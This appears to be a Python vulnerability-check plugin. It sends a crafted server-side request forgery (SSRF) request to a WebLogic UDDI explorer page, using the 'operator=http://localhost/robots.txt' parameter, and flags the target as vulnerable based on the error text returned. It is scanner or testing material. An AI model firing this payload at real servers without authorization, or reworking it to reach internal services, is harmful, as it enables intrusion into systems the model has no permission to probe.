from typing import Optional

import requests


def run(url: str, port: int, vulnerable="WebLogic SSRF Vulnerable") -> Optional[str]:
    target_url = (
        f"{url}:{port}/uddiexplorer/SearchPublicRegistries.jsp?"
        "operator=http://localhost/robots.txt&"
        "rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&"
        "selfor=Business+location&btnSubmit=Search"
    )
    try:
        response = requests.get(target_url, verify=False, timeout=10)
        if ("weblogic.uddi.client.structures.exception.XML_SoapException" in response.text
                and "IO Exception on sendMessage" not in response.text):
            return vulnerable
        return None
    except Exception:
        return None
